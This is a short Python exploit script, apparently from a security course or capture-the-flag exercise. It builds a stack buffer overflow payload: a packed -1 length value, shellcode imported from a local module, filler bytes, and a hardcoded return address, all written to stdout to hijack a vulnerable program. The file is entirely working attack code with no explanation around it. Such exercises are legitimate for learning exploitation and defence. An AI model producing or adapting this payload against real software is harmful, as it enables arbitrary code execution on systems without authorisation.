#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

shell_len = len(shellcode)
padding_len = (44 - shell_len)
output=(pack("<i",-1))+shellcode+(b"\x32"*padding_len) + b"\x40\xb3\xfe\xff"  
sys.stdout.buffer.write(output)
#sys.stdout.buffer.write(pack("<I", -1))
#sys.stdout.buffer.write(pack("<I", 25))
#sys.stdout.buffer.write(pack("<I", 32))

